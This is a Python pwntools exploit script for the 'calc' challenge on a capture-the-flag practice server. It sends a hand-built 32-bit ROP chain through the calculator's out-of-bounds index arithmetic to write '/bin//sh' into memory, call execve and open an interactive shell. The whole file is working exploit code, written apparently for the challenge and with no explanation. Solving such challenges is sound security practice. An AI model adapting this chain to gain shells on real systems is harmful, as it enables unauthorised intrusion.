from pwn import *

BEDUG = False

if BEDUG==True:
    io = process('./calc')
else:
    io = remote('chall.pwnable.tw', 10100)

def calc(payload):
    print(io.recv())
    io.sendline(payload)

chain = []

chain.append(0x080701aa) # pop edx ; ret
chain.append(0x080ec060) # @ .data
#chain.append(0x0805c34b) # pop eax ; ret
chain.append(0x080bc545)
chain.append(u32(b'/bin'))
chain.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
chain.append(0x080701aa) # pop edx ; ret
chain.append(0x080ec064) # @ .data + 4
chain.append(0x0805c34b) # pop eax ; ret
chain.append(u32(b'//sh'))
chain.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
chain.append(0x080701aa) # pop edx ; ret
chain.append(0x080ec068) # @ .data + 8
chain.append(0x080550d0) # xor eax, eax ; ret
chain.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
chain.append(0x080481d1) # pop ebx ; ret
chain.append(0x080ec060) # @ .data
chain.append(0x080701d1) # pop ecx ; pop ebx ; ret
chain.append(0x080ec068) # @ .data + 8
chain.append(0x080ec060) # padding without overwrite ebx
chain.append(0x080701aa) # pop edx ; ret
chain.append(0x080ec068) # @ .data + 8
chain.append(0x0805c34b) # pop eax ; ret
chain.append(11)
chain.append(0x08049a21) # int 0x80

offset = 369

iterate = len(chain)-1

while (iterate>-1):
    calc('+'+str(offset+iterate-1)+'+'+str(chain[iterate]))
    iterate-=1

calc(b'nice')
io.interactive()
